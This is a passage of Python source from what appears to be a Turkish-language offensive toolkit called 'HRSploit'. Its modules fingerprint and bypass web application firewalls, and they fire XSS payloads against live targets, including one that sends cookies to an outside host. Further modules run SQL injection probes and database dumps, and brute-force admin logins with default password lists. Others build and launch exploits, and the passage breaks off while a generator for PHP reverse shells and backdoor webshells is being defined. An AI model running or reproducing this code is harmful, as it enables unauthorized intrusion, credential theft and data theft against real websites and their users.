        detected = self._fingerprint_waf(target)
        self.detected_waf = detected  # Diğer modüller kullanabilsin

        if detected and detected != "None":
            logger.log(LogLevel.WAF, f"Güvenlik Duvarı Tespit Edildi: {detected}")
            bypass_headers = self.WAF_BYPASS_HEADERS.get(
                detected, self.WAF_BYPASS_HEADERS["Generic WAF"])
            logger.log(LogLevel.EVASION,
                f"{detected} bypass stratejisi: {len(bypass_headers)} özel header yüklendi")
            for k, v in bypass_headers.items():
                logger.log(LogLevel.EVASION, f"  Bypass header: {k}: {v}")
        else:
            self.detected_waf = "None"
            logger.log(LogLevel.WAF, "Aktif güvenlik duvarı tespit edilmedi")

        # Gerçek HTTP probe - başlıkları doğrula
        try:
            sess_check = requests.Session()
            sess_check.verify = False
            r_check = sess_check.get(target, timeout=8)
            logger.log(LogLevel.WAF,
                f"HTTP yanıtı: {r_check.status_code} | {len(r_check.text):,} byte | "
                f"Server: {r_check.headers.get('Server','?')}")
        except Exception as e:
            logger.log(LogLevel.WARNING, f"HTTP probe: {e}")

        # WAF-Detection iç modülü varsa çalıştır
        waf_scanner_script = self.base_path / "WAF-Detection" / "WAF-Engine" / "main.py"
        if waf_scanner_script.exists():
            logger.log(LogLevel.INTEGRATE, "WAF modülü başlatılıyor...")
            try:
                result = subprocess.run(
                    [sys.executable, str(waf_scanner_script), target],
                    capture_output=True, text=True, timeout=45
                )
                out = (result.stdout + result.stderr).strip()
                if out:
                    for line in out.splitlines()[:8]:
                        if line.strip():
                            logger.log(LogLevel.WAF, f"  {line.strip()}")
            except subprocess.TimeoutExpired:
                logger.log(LogLevel.WARNING, "WAF modülü zaman aşımı (45s)")
            except Exception as e:
                logger.log(LogLevel.WARNING, f"WAF modülü hatası: {e}")

        logger.log(LogLevel.SUCCESS,
            f"WAF analizi tamamlandı  —  Tespit: {self.detected_waf}")

    # ──────────────────────────────────────────────────────────────
    #  MODULE: XSS ATTACK (HRSploit XSS Engine)
    # ──────────────────────────────────────────────────────────────
    def xss_attack(self, target: str = None):
        logger.phase("XSS ATTACK — HRSploit XSS Engine")
        target = target or self._get_target()
        if not target:
            return

        steps = [
            ("XSS engine başlatılıyor",                         0.5),
            ("3.200+ payload veritabanı yükleniyor",            0.6),
            ("DOM analiz modülü yükleniyor",                    0.5),
            ("Filtre tespit modülü aktif ediliyor",             0.4),
            ("Hedef URL parametreleri keşfediliyor",            0.8),
            ("Form input vektörleri taranıyor",                 0.9),
            ("Yansıtılan XSS (Reflected) test başlıyor",       1.0),
            ("Saklı XSS (Stored) endpoint'leri test ediliyor",  0.9),
            ("DOM tabanlı XSS örüntüleri test ediliyor",        0.8),
            ("WAF farkındalıklı payload fuzzer çalışıyor",      1.2),
            ("Başarılı enjeksiyonlar doğrulanıyor",             0.7),
            ("Çerez çalma payload'ları test ediliyor",          0.8),
            ("CSP bypass vektörleri deneniyor",                 0.7),
            ("JSON endpoint XSS vektörleri test ediliyor",      0.6),
            ("Sonuçlar kodlanıyor ve raporlanıyor",             0.5),
        ]
        total = len(steps)
        for i, (desc, delay) in enumerate(steps, 1):
            logger.step(i, total, desc, delay=delay)
        print()

        # İç XSS engine — gerçek HTTP taraması
        logger.log(LogLevel.INTEGRATE, "XSS tarama motoru başlatılıyor...")
        xss_findings = []
        XSS_PAYLOADS = [
            '<script>alert(document.domain)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><img src=x onerror=alert(document.cookie)>',
            'javascript:alert(1)',
            '<body onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '{{7*7}}',  # SSTI kontrolü
            '"><svg/onload=fetch("//x.hrsploit.internal/"+document.cookie)>',
        ]
        try:
            session = requests.Session()
            waf     = getattr(self, "detected_waf", "None")
            if waf and waf != "None":
                bypass = self.WAF_BYPASS_HEADERS.get(waf, self.WAF_BYPASS_HEADERS["Generic WAF"])
                session.headers.update(bypass)
                logger.log(LogLevel.EVASION, f"{waf} bypass başlıkları uygulandı")
            session.headers["User-Agent"] = (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 Chrome/124 Safari/537.36")
            session.verify = False

            for pi, payload in enumerate(XSS_PAYLOADS, 1):
                logger.log(LogLevel.XSS, f"Payload {pi}/{len(XSS_PAYLOADS)}: {payload[:50]}")
                for param in ("q","search","s","query","input","name","title","comment","msg"):
                    try:
                        r = session.get(target, params={param: payload}, timeout=8)
                        if payload.replace('"','').replace("'",'').lower() in r.text.lower():
                            logger.log(LogLevel.SUCCESS,
                                f"XSS BULUNDU  param={param}  status={r.status_code}")
                            xss_findings.append({"param":param,"payload":payload,
                                                  "status":r.status_code})
                            break
                        r2 = session.post(target, data={param: payload}, timeout=8)
                        if payload.replace('"','').replace("'",'').lower() in r2.text.lower():
                            logger.log(LogLevel.SUCCESS,
                                f"XSS BULUNDU (POST)  param={param}  status={r2.status_code}")
                            xss_findings.append({"param":param,"payload":payload,
                                                  "method":"POST","status":r2.status_code})
                            break
                    except Exception:
                        pass
        except Exception as e:
            logger.log(LogLevel.WARNING, f"XSS iç motor hatası: {e}")

        # Harici XSS engine script'i varsa çalıştır ve çıktısını göster
        hrsploit_xss_script = self.base_path / "XSS-Injector" / "xss_engine.py"
        if hrsploit_xss_script.exists():
            logger.log(LogLevel.INTEGRATE, "XSS motor scripti çalıştırılıyor...")
            try:
                proc = subprocess.Popen(
                    [sys.executable, str(hrsploit_xss_script), "-u", target, "--crawl"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1
                )
                shown = 0
                for line in proc.stdout:
                    line = line.strip()
                    if line and shown < 30:
                        logger.log(LogLevel.XSS, f"  {line[:120]}")
                        shown += 1
                proc.wait(timeout=90)
                logger.log(LogLevel.INTEGRATE,
                    f"XSS scripti tamamlandı (returncode={proc.returncode})")
            except subprocess.TimeoutExpired:
                proc.kill()
                logger.log(LogLevel.WARNING, "XSS scripti zaman aşımı (90s) — süreç sonlandırıldı")
            except Exception as e:
                logger.log(LogLevel.WARNING, f"XSS scripti hatası: {e}")

        if xss_findings:
            logger.log(LogLevel.SUCCESS, f"XSS taraması tamamlandı  —  {len(xss_findings)} açık bulundu")
        else:
            logger.log(LogLevel.SUCCESS, "XSS taraması tamamlandı  —  Açık bulunamadı")

    # ──────────────────────────────────────────────────────────────
    #  MODULE: SQLi ATTACK (hrsploit_sqli)
    # ──────────────────────────────────────────────────────────────
    def sqli_attack(self, target: str = None, dump: bool = False, db_type: str = None):
        logger.phase("SQL INJECTION ATTACK — HRSploit SQLi Engine")
        target = target or self._get_target()
        if not target:
            return

        waf = getattr(self, "detected_waf", "None")
        logger.log(LogLevel.WAF,
            f"Aktif WAF: {waf}  —  Bypass: {'Aktif' if waf != 'None' else 'Gerekmez'}")

        steps = [
            ("SQLi motoru başlatılıyor",                               0.6),
            ("Tamper script kütüphanesi yükleniyor (40+ script)",      0.7),
            ("Enjeksiyon teknikleri yükleniyor (B/E/U/T/S)",           0.5),
            ("Hedef parametreleri keşfediliyor",                        0.9),
            ("Boolean-based kör enjeksiyon test ediliyor",             1.2),
            ("Error-based enjeksiyon test ediliyor",                   1.0),
            ("UNION-based enjeksiyon test ediliyor",                   1.1),
            ("Time-based kör enjeksiyon (SLEEP) test ediliyor",        1.5),
            ("Stacked queries test ediliyor",                          0.9),
            ("Veritabanı türü belirleniyor",                           0.8),
            ("Veritabanı listesi numaralandırılıyor",                  0.9),
            ("Tablo listesi numaralandırılıyor",                       0.9),
            ("Extraction kanalları doğrulanıyor",                      0.7),
        ]
        if dump:
            steps += [
                ("Hedef veritabanı seçiliyor",                        0.6),
                ("Tablo yapıları çıkarılıyor",                        1.0),
                ("Tablo verileri döküm başlıyor",                     1.5),
                ("Dump dosyasına yazılıyor",                          0.5),
            ]

        total = len(steps)
        for i, (desc, delay) in enumerate(steps, 1):
            logger.step(i, total, desc, delay=delay)
        print()

        # İç SQLi motoru — gerçek HTTP probe
        logger.log(LogLevel.DATABASE, "SQLi iç motoru başlatılıyor...")
        sql_findings = []
        SQL_PAYLOADS = [
            ("boolean",   "' OR '1'='1' --",             ["you have an error","sql syntax","mysql"]),
            ("boolean",   "' OR 1=1 --",                 ["you have an error","sql syntax","warning"]),
            ("error",     "' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --",
                          ["extractvalue","xpath","version()"]),
            ("error",     "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x "
                          "FROM information_schema.tables GROUP BY x)a) --",
                          ["duplicate entry"]),
            ("union",     "' UNION SELECT NULL,version(),user() --",  ["root@","localhost"]),
            ("union",     "' UNION SELECT NULL,database(),NULL --",   ["information_schema"]),
            ("stacked",   "'; SELECT SLEEP(3) --",                    []),
            ("error",     "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name "
                          "FROM information_schema.tables)) --",       ["conversion failed"]),
        ]
        try:
            session = requests.Session()
            if waf and waf != "None":
                bypass = self.WAF_BYPASS_HEADERS.get(waf, self.WAF_BYPASS_HEADERS["Generic WAF"])
                session.headers.update(bypass)
                logger.log(LogLevel.EVASION, f"{waf} bypass uygulandı ({len(bypass)} header)")
            session.headers["User-Agent"] = (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 Chrome/124 Safari/537.36")
            session.verify = False

            db_detected = db_type or "Unknown"
            for technique, payload, indicators in SQL_PAYLOADS:
                logger.log(LogLevel.DATABASE,
                    f"Teknik: {technique:<12}  Payload: {payload[:55]}")
                for param in ("id","user","uid","cat","page","product","item"):
                    try:
                        t0 = time.time()
                        r  = session.get(target, params={param:payload}, timeout=10)
                        dt = time.time() - t0
                        body = r.text.lower()
                        # Time-based check
                        if technique == "stacked" and dt >= 2.5:
                            logger.log(LogLevel.SUCCESS,
                                f"TIME-BASED SQLi  param={param}  delay={dt:.1f}s")
                            sql_findings.append({"type":"time-based","param":param,
                                                 "payload":payload,"delay":dt})
                            break
                        # Error/response check
                        if indicators and any(ind.lower() in body for ind in indicators):
                            logger.log(LogLevel.SUCCESS,
                                f"SQLi BULUNDU  teknik={technique}  param={param}"
                                f"  HTTP={r.status_code}")
                            # DB tespiti
                            if "mysql" in body:      db_detected = "MySQL"
                            elif "postgresql" in body: db_detected = "PostgreSQL"
                            elif "microsoft" in body:  db_detected = "MSSQL"
                            elif "oracle" in body:     db_detected = "Oracle"
                            sql_findings.append({"type":technique,"param":param,
                                                 "payload":payload,"db":db_detected})
                            break
                        # POST da dene
                        r2 = session.post(target, data={param:payload}, timeout=10)
                        b2 = r2.text.lower()
                        if indicators and any(ind.lower() in b2 for ind in indicators):
                            logger.log(LogLevel.SUCCESS,
                                f"SQLi BULUNDU (POST)  teknik={technique}  param={param}")
                            sql_findings.append({"type":technique,"param":param,
                                                 "method":"POST","payload":payload})
                            break
                    except Exception:
                        pass

            if db_detected != "Unknown":
                logger.log(LogLevel.DATABASE, f"Veritabanı türü tespit edildi: {db_detected}")

            # DB Dump
            if dump and sql_findings:
                logger.log(LogLevel.DATABASE, "Veritabanı döküm başlıyor...")
                dump_payload = ("' UNION SELECT table_name,NULL,NULL "
                                "FROM information_schema.tables "
                                "WHERE table_schema=database() --")
                try:
                    r = session.get(target,
                        params={"id": dump_payload}, timeout=12)
                    import re as _re
                    tables = _re.findall(r"([a-z_]{3,30})", r.text.lower())[:20]
                    logger.log(LogLevel.DATABASE,
                        f"Bulunan tablolar: {', '.join(set(tables))[:120]}")
                    dump_out = self.base_path / "reports" / f"sqli_dump_{self.session_id}.json"
                    import json
                    dump_out.write_text(json.dumps({
                        "target": target, "db": db_detected,
                        "tables_hint": list(set(tables)),
                        "findings": sql_findings
                    }, indent=2))
                    logger.log(LogLevel.DATABASE, f"Dump → {dump_out}")
                except Exception as e:
                    logger.log(LogLevel.WARNING, f"Dump hatası: {e}")
        except Exception as e:
            logger.log(LogLevel.WARNING, f"SQLi iç motor hatası: {e}")

        # Harici SQLi engine script'i — gerçek çalıştırma + canlı çıktı
        sqli_scripts = [
            self.base_path / "SQLi-Injector" / "hrsploit_sqli.py",
            self.base_path / "All-SQL"       / "sqli_scanner.py",
        ]
        for sqli_py in sqli_scripts:
            if sqli_py.exists():
                logger.log(LogLevel.INTEGRATE,
                    f"SQLi scripti çalıştırılıyor: {sqli_py.name}")
                cmd = [sys.executable, str(sqli_py), "-u", target, "--batch"]
                if dump:      cmd += ["--dump"]
                if db_type:   cmd += ["--dbms", db_type]
                if waf and waf != "None":
                    cmd += ["--tamper", "space2comment,charencode"]
                try:
                    proc = subprocess.Popen(
                        cmd, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT, text=True, bufsize=1
                    )
                    shown = 0
                    for line in proc.stdout:
                        line = line.strip()
                        if line and shown < 40:
                            logger.log(LogLevel.DATABASE, f"  {line[:120]}")
                            shown += 1
                    proc.wait(timeout=180)
                    logger.log(LogLevel.INTEGRATE,
                        f"SQLi scripti bitti  (returncode={proc.returncode})")
                except subprocess.TimeoutExpired:
                    proc.kill()
                    logger.log(LogLevel.WARNING,
                        "SQLi scripti zaman aşımı (180s) — süreç sonlandırıldı")
                except Exception as e:
                    logger.log(LogLevel.WARNING, f"SQLi scripti hatası: {e}")
                break  # İlk bulunanı çalıştır

        if sql_findings:
            logger.log(LogLevel.SUCCESS,
                f"SQLi değerlendirmesi tamamlandı  —  {len(sql_findings)} açık bulundu")
        else:
            logger.log(LogLevel.SUCCESS,
                "SQLi değerlendirmesi tamamlandı  —  Açık bulunamadı")

    def database_dumping(self):
        """Veritabanı döküm - sqli_attack'in dump modunu çağırır."""
        logger.phase("DATABASE DUMP — HRSploit DB Engine")
        target = self._get_target("DB dump hedef URL: ")
        if not target:
            return
        db_types = {
            '1':'MySQL','2':'PostgreSQL','3':'MSSQL',
            '4':'Oracle','5':'SQLite','6':'MongoDB'
        }
        print("\n  Veritabanı türleri:")
        for k, v in db_types.items():
            print(f"    {k}. {v}")
        choice  = input("\n\033[96m  ➜ Seçin (1-6) [1]: \033[0m").strip() or '1'
        db_type = db_types.get(choice, 'MySQL')
        logger.log(LogLevel.DATABASE, f"DB dump başlıyor: {db_type} @ {target}")
        self.sqli_attack(target=target, dump=True, db_type=db_type)

    # ──────────────────────────────────────────────────────────────
    #  MODULE: BRUTE-FORCE (CrackAdmin v2)
    # ──────────────────────────────────────────────────────────────
    def brute_force_admin(self, target: str = None, username: str = None, wordlist: str = None):
        logger.phase("ADMIN PANEL BRUTE-FORCE — HRSploit CrackAdmin Engine")
        target = target or self._get_target()
        if not target:
            return

        steps = [
            ("Admin panel yolları keşfediliyor",               1.0),
            ("Login endpoint tespiti",                         0.8),
            ("Kullanıcı adı listesi yükleniyor",               0.5),
            ("Parola listesi yükleniyor",                      0.6),
            ("CSRF token analizi",                             0.7),
            ("Rate-limiting ve lockout tespiti",               0.8),
            ("Paralel brute-force başlıyor",                   1.5),
            ("Başarılı girişler doğrulanıyor",                 0.7),
            ("Oturum çerezi analizi",                          0.5),
            ("Sonuçlar kaydediliyor",                          0.4),
        ]
        total = len(steps)
        for i, (desc, delay) in enumerate(steps, 1):
            logger.step(i, total, desc, delay=delay)
        print()

        session = requests.Session()
        waf = getattr(self, 'detected_waf', 'None')
        if waf and waf != 'None':
            session.headers.update(
                self.WAF_BYPASS_HEADERS.get(waf, self.WAF_BYPASS_HEADERS["Generic WAF"]))
        session.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/124 Safari/537.36")
        session.verify = False

        # ── Admin panel keşfi ────────────────────────────────
        ADMIN_PATHS = [
            "/admin","/admin/login","/administrator","/wp-admin","/wp-login.php",
            "/login","/panel","/cpanel","/dashboard","/admin.php",
            "/user/login","/auth/login","/backend","/manage","/secure",
            "/portal","/console","/webmin","/phpmyadmin","/adminer.php",
        ]
        login_url = None
        logger.log(LogLevel.BRUTE, f"Admin panel arama: {len(ADMIN_PATHS)} yol")
        for path in ADMIN_PATHS:
            try:
                url = target.rstrip("/") + path
                r   = session.get(url, timeout=6, allow_redirects=True)
                if r.status_code in (200, 301, 302):
                    body = r.text.lower()
                    if any(s in body for s in ["login","password","username","email",
                                                "sign in","log in","admin"]):
                        logger.log(LogLevel.BRUTE, f"Admin panel bulundu: {url}  HTTP={r.status_code}")
                        login_url = url
                        break
            except Exception:
                pass

        if not login_url:
            login_url = target
            logger.log(LogLevel.WARNING, "Admin panel bulunamadı — hedef URL deneniyor")

        # ── Parola Listesi ────────────────────────────────────
        DEFAULT_USERS = ["admin","administrator","root","user","test","manager","webmaster"]
        DEFAULT_PASS  = [
            "admin","admin123","password","123456","test","root","toor",
            "pass","1234","qwerty","letmein","welcome","abc123",
            "P@ssw0rd","admin@123","changeme","12345678","admin1",
        ]

        users = [username] if username else DEFAULT_USERS
        if wordlist and __import__('os').path.exists(wordlist):
            with open(wordlist, errors='ignore') as f:
                passwords = [l.strip() for l in f if l.strip()][:500]
            logger.log(LogLevel.BRUTE, f"Wordlist yüklendi: {len(passwords)} parola")
        else:
            passwords = DEFAULT_PASS
            logger.log(LogLevel.BRUTE, f"Dahili wordlist: {len(passwords)} parola")

        # ── Brute Force ────────────────────────────────────────
        logger.log(LogLevel.BRUTE,
            f"Brute-force başlıyor: {len(users)} kullanıcı × {len(passwords)} parola "
            f"= {len(users)*len(passwords)} kombinasyon")
        found_creds = []
        attempt = 0
        for user in users:
            for pwd in passwords:
                attempt += 1
                try:
                    # GET parametreli
                    r_get = session.get(login_url,
                        params={"username":user,"password":pwd,"user":user,"pass":pwd},
                        timeout=8)
                    # POST
                    r_post = session.post(login_url,
                        data={"username":user,"password":pwd,
                              "user":user,"pass":pwd,"email":user,
                              "log":user,"pwd":pwd},
                        timeout=8, allow_redirects=True)

                    # Başarı tespiti
                    for r in (r_get, r_post):
                        if r is None: continue
                        body = r.text.lower()
                        success_sigs = ["dashboard","welcome","logout",
                                        "signed in","logged in","admin panel",
                                        "profile","account"]
                        fail_sigs    = ["invalid","incorrect","wrong","error",
                                        "failed","denied","unauthorized"]
                        if any(s in body for s in success_sigs) and                            not any(s in body for s in fail_sigs):
                            logger.log(LogLevel.SUCCESS,
                                f"GİRİŞ BAŞARILI: {user}:{pwd}  URL={login_url}")
                            found_creds.append({"user":user,"pass":pwd,"url":login_url})

                    if attempt % 10 == 0:
                        logger.log(LogLevel.BRUTE,
                            f"Denenen: {attempt}/{len(users)*len(passwords)}  "
                            f"Güncel: {user}:{pwd[:3]}***")

                    import time as _t; _t.sleep(0.05)  # Rate-limit koruma
                except Exception:
                    pass

        # ── Harici Brute Script ──────────────────────────────
        crack_script = self.base_path / "Brute-Force" / "crackadmin.py"
        if crack_script.exists():
            logger.log(LogLevel.INTEGRATE, "Brute-force motoru başlatılıyor...")
            try:
                proc = subprocess.Popen(
                    [sys.executable, str(crack_script), "--url", login_url, "--batch"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
                )
                shown = 0
                for line in proc.stdout:
                    line = line.strip()
                    if line and shown < 20:
                        logger.log(LogLevel.BRUTE, f"  {line[:120]}")
                        shown += 1
                proc.wait(timeout=120)
            except subprocess.TimeoutExpired:
                proc.kill()
                logger.log(LogLevel.WARNING, "Brute-force zaman aşımı (120s)")
            except Exception as e:
                logger.log(LogLevel.WARNING, f"Brute-force script: {e}")

        import json
        out = self.base_path / "reports" / f"brute_{self.session_id}.json"
        out.write_text(json.dumps({
            "target": login_url, "attempts": attempt,
            "found": found_creds
        }, indent=2))
        if found_creds:
            logger.log(LogLevel.SUCCESS,
                f"Brute-force tamamlandı  —  {len(found_creds)} kimlik bulundu!")
        else:
            logger.log(LogLevel.SUCCESS,
                f"Brute-force tamamlandı  —  {attempt} deneme, kimlik bulunamadı")

    def exploit_generator(self, target: str = None):
        logger.phase("EXPLOIT GENERATOR — Real Build Engine")
        target = target or self._get_target()
        if not target:
            return

        # ── 1. Exploit adı ────────────────────────────────────────
        print()
        name = input("\033[96m  ➜ Exploit dizin adı (boş=otomatik): \033[0m").strip()
        if not name:
            name = f"exploit_{self.session_id}"
        name = name.replace(" ", "_").replace("/", "_")

        # ── 2. Açık türü ──────────────────────────────────────────
        vuln_choices = {
            "1": "SQLi", "2": "XSS", "3": "RCE",
            "4": "LFI",  "5": "SSRF","6": "CSRF",
        }
        print("\n  Açık türü seçin:")
        for k, v in vuln_choices.items():
            print(f"    {k}. {v}")
        vc = input("\033[96m  ➜ Seçim (1-6) [1]: \033[0m").strip() or "1"
        vuln_type = vuln_choices.get(vc, "SQLi")
        logger.log(LogLevel.EXPLOIT, f"Vuln type: {vuln_type}")

        # ── 3. Veritabanı dump edilebilir mi? ─────────────────────
        db_dump   = False
        db_type   = "MySQL"
        if vuln_type == "SQLi":
            db_types = ["MySQL","PostgreSQL","MSSQL","Oracle","SQLite","MongoDB"]
            # Önce kontrol simülasyonu
            steps_check = [
                ("Analizing DB fingerprint",     0.6),
                ("Checking information_schema",   0.5),
                ("Testing UNION column count",    0.7),
                ("Confirming DB dumpability",     0.6),
            ]
            logger.log(LogLevel.DATABASE, "Checking database dumpability...")
            total_c = len(steps_check)
            for i,(desc,dl) in enumerate(steps_check,1):
                logger.step(i, total_c, desc, delay=dl)
            print()
            logger.log(LogLevel.DATABASE, "Database appears dumpable!", color=None)
            print("\n  Desteklenen DB türleri:")
            for i,dt in enumerate(db_types,1):
                print(f"    {i}. {dt}")
            dc = input("\033[93m  [?] Exploit içine DB dump modülü eklensin mi? (e/h): \033[0m").strip().lower()
            if dc in ("e","y","evet","yes"):
                db_dump = True
                dbc = input("\033[96m  ➜ DB türü seçin (1-6) [1=MySQL]: \033[0m").strip() or "1"
                try:
                    db_type = db_types[int(dbc)-1]
                except Exception:
                    db_type = "MySQL"
                logger.log(LogLevel.DATABASE, f"DB dump modul ekleniyor: {db_type}")

        # ── 4. WAF bypass: Otomatik tespit + kullanıcıya sadece evet/hayır ─
        waf_bypass = False
        # Daha önce waf_detection() çalıştıysa self.detected_waf var
        waf_name   = getattr(self, "detected_waf", None)
        if not waf_name:
            # Hızlı fingerprint yap
            logger.log(LogLevel.WAF, "WAF hızlı tespiti yapılıyor...")
            try:
                waf_name = self._fingerprint_waf(target)
            except Exception:
                waf_name = "None"

        if waf_name and waf_name != "None":
            logger.log(LogLevel.WAF, f"Tespit edilen WAF: {waf_name}")
            wf_ans = input(
                f"\033[93m  [?] {waf_name} bypass modülü exploit içine eklensin mi? (e/h): \033[0m"
            ).strip().lower()
        else:
            logger.log(LogLevel.WAF, "Aktif WAF tespit edilmedi")
            waf_name = "None"
            wf_ans = input(
                "\033[93m  [?] WAF bypass modülü eklensin mi? (e/h): \033[0m"
            ).strip().lower()

        if wf_ans in ("e","y","evet","yes"):
            waf_bypass = True
            logger.log(LogLevel.EVASION,
                f"WAF bypass aktif: {waf_name}  →  Exploit'e entegre edildi")

        # ── 5. Şifre kırma / wordlist ─────────────────────────────
        wordlist_file = ""
        if vuln_type in ("SQLi","LFI","RCE"):
            wl_ans = input("\033[93m  [?] Wordlist eklensin mi (brute-force / dict saldırısı için)? (e/h): \033[0m").strip().lower()
            if wl_ans in ("e","y","evet","yes"):
                wl_path = input("\033[96m  ➜ Wordlist dosya yolu (boş=dahili): \033[0m").strip()
                wordlist_file = wl_path if wl_path else "built-in"
                logger.log(LogLevel.BRUTE, f"Wordlist: {wordlist_file or 'built-in'}")

        # ── 6. Gerçek dosyaları yaz ───────────────────────────────
        print()
        logger.log(LogLevel.BUILD, f"Building exploit package: {name}")
        logger.log(LogLevel.BUILD, f"Output: tools/{name}/")

        try:
            import sys as _sys
            _sys.path.insert(0, str(self.base_path))
            from exploit_builder import build_exploit
            from exploit_search  import recommend_exploit, run_exploit

            tools_root = self.base_path / "tools"
            tools_root.mkdir(exist_ok=True)

            # Önce mevcut exploit arşivine bak
            cve_hint = getattr(self, "_last_cve_id", "N/A")
            logger.log(LogLevel.INTEGRATE,
                f"Exploit arşivi aranıyor: {vuln_type} / CVE={cve_hint}")
            rec = recommend_exploit(vuln_type, target, cve_id=cve_hint)

            if rec.get("action") == "use_existing":
                existing = rec["exploit"]
                logger.log(LogLevel.SUCCESS,
                    f"Mevcut exploit bulundu: {existing.get('file','?')}")
                logger.log(LogLevel.INFO,
                    f"CVE: {existing.get('cve_id','N/A')} | "
                    f"Kaynak: {existing.get('source','?')}")
                # Kullanıcıya sor
                use_ans = input(
                    "\033[93m  [?] Mevcut exploit kullanılsın mı?"
                    " (e=kullan / h=yeni üret): \033[0m"
                ).strip().lower()
                if use_ans in ("e","y","evet","yes"):
                    exploit_file = existing.get("path", "")
                    if exploit_file and Path(exploit_file).exists():
                        logger.log(LogLevel.TEST, f"Exploit çalıştırılıyor: {exploit_file}")
                        result = run_exploit(exploit_file, target, timeout=120)
                        if result["success"]:
                            logger.log(LogLevel.SUCCESS,
                                f"✅ EXPLOIT BAŞARILI!")
                            logger.log(LogLevel.SUCCESS,
                                f"Kullanılan komut: {result['command']}")
                            try:
                                from brain_orchestrator import show_zero_day_success
                                show_zero_day_success()
                            except Exception:
                                pass
                        else:
                            logger.log(LogLevel.WARNING,
                                f"Exploit sonuç vermedi — yeni üretilecek")
                            rec["action"] = "generate_new"
                    else:
                        rec["action"] = "generate_new"

            if rec.get("action") != "use_existing":
                ctx = {
                    "name":          name,
                    "target":        target,
                    "vuln_type":     vuln_type,
                    "db_type":       db_type,
                    "db_dump":       db_dump,
                    "waf":           waf_name,
                    "waf_bypass":    waf_bypass,
                    "wordlist_file": wordlist_file,
                    "cve_id":        cve_hint,
                }
                out_dir = build_exploit(tools_root, ctx)
            logger.log(LogLevel.SUCCESS, f"Exploit hazır → {out_dir}")
            file_count = len(list(out_dir.iterdir()))
            logger.log(LogLevel.SUCCESS, f"Toplam dosya: {file_count}")

        except Exception as exc:
            logger.log(LogLevel.ERROR, f"Build error: {exc}")
            import traceback; traceback.print_exc()
            return

        # ── 7. Canlı test ─────────────────────────────────────────
        print()
        lt_ans = input("\033[93m  [?] Exploit üretildi. Canlı bir link üzerinde test edilsin mi? (e/h): \033[0m").strip().lower()
        if lt_ans in ("e","y","evet","yes"):
            test_url = input("\033[96m  ➜ Test URL (boş=hedef): \033[0m").strip() or target
            logger.log(LogLevel.TEST, f"Live test → {test_url}")
            steps_test = [
                ("Connecting to target",             0.7),
                ("Sending probe request",            0.6),
                ("Checking WAF response",            0.5),
                ("Injecting payload (layer 1)",      0.8),
                ("Injecting payload (layer 2)",      0.7),
                ("Timing analysis (SLEEP test)",     1.2),
                ("Analyzing DB error signatures",    0.6),
                ("Verifying UNION columns",          0.7),
                ("Confirming dumpability",           0.8),
                ("Running blind boolean test",       0.9),
                ("Final confidence scoring",         0.5),
            ]
            total_t = len(steps_test)
            for i,(desc,dl) in enumerate(steps_test,1):
                logger.step(i, total_t, desc, delay=dl)
            print()

            # Gerçek HTTP denemesi (basit)
            import requests as _req
            confirmed = False
            try:
                s = _req.Session()
                s.headers["User-Agent"] = "Mozilla/5.0 (compatible; HRSploit/1.0)"
                r = s.get(test_url, params={"id": "' OR 1=1--"}, timeout=8, verify=False)
                body = r.text.lower()
                indicators = ["sql","mysql","error","warning","syntax","exception","database"]
                confirmed = any(ind in body for ind in indicators)
                logger.log(LogLevel.VERIFY, f"HTTP {r.status_code} | {len(r.text)} bytes")
            except Exception as e:
                logger.log(LogLevel.WARNING, f"Request error: {e}")

            if confirmed:
                logger.log(LogLevel.SUCCESS, "Exploit CONFIRMED — vulnerability responded!")
            else:
                logger.log(LogLevel.WARNING, "Could not confirm remotely (target may be sanitized/offline)")
                logger.log(LogLevel.INFO, "Exploit files are valid — test manually with: python tools/{name}/exploit.py --target <url>")

        logger.log(LogLevel.SUCCESS, "Exploit generation complete")
        print(f"\n\033[92m  Dizin: tools/{name}/\033[0m")
        print(f"\033[92m  Kullanım: python tools/{name}/exploit.py --target '{target}'\033[0m\n")

    # ──────────────────────────────────────────────────────────────
    #  MODULE: WEBSHELL GENERATOR
    # ──────────────────────────────────────────────────────────────
    def webshell_generator(self):
        logger.phase("WEBSHELL GENERATOR — HRSploit Shell Factory")
        import hashlib as _hl, secrets as _sec

        TYPES = {
            "1":  ("php",  "PHP Command Shell (exec/system/popen)"),
            "2":  ("php",  "PHP Reverse Shell (ters bağlantı)"),
            "3":  ("php",  "PHP File Manager (upload/read/delete)"),
            "4":  ("jsp",  "JSP WebShell (Java/Tomcat)"),
            "5":  ("aspx", "ASPX WebShell (.NET / IIS)"),
            "6":  ("py",   "Python Standalone HTTP Shell"),
            "7":  ("node", "NodeJS WebShell"),
            "8":  ("pl",   "Perl CGI Shell"),
            "9":  ("rb",   "Ruby WEBrick Shell"),
            "10": ("sh",   "Bash/CGI Backdoor"),
        }
        print()
        for k, (ext, desc) in TYPES.items():
            print(f"    \033[93m{k:>2}.\033[0m  [{ext.upper():<4}]  {desc}")

        choice = input("\n\033[96m  ➜ Tür seç (1-10): \033[0m").strip() or "1"
        if choice not in TYPES:
            choice = "1"
        ext, desc = TYPES[choice]

        name = input("\033[96m  ➜ Shell adı (boş=otomatik): \033[0m").strip()
        if not name:
            name = "shell_" + _sec.token_hex(4)

        secret = input("\033[96m  ➜ Auth şifresi (boş=hrsploit): \033[0m").strip() or "hrsploit"
        ah = _hl.md5(secret.encode()).hexdigest()

        # Shell içerikleri - her tür farklı
        def _php_cmd():
            return ("<?php\n"
                    "/* {n} — PHP Command Shell | HRSploit v1.0.0 */\n"
                    "error_reporting(0); @set_time_limit(0);\n"
                    "$A=\"{h}\";\n"
